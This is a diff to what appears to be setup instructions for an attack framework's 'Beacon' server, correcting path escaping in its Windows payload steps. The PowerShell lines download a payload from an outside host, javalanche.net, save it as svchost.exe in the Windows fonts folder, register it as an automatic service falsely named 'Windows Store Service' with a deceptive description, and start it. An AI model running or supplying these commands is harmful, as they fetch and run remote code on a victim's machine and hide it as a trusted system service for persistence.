@@ -37,8 +37,8 @@ $ sudo ./serverSetup.sh -server Beacon
 
 Windows Payload
 
-ps> wget -o C:\\Windows\fonts\svchost.exe http://javalanche.net/windowsPayload
-ps> New-Service -name 'Windows Store Service' -BinaryPathName 'C:\\Windows\\fonts\\svchost.exe' -DisplayName 'Windows Store Service' -Description 'This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly' -Startuptype Automatic
+ps> wget -o C:\Windows\fonts\svchost.exe http://javalanche.net/windowsPayload
+ps> New-Service -name 'Windows Store Service' -BinaryPathName 'C:\Windows\fonts\svchost.exe' -DisplayName 'Windows Store Service' -Description 'This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly' -Startuptype Automatic
 ps> Start-Service -name 'Windows Store Service'
 
 
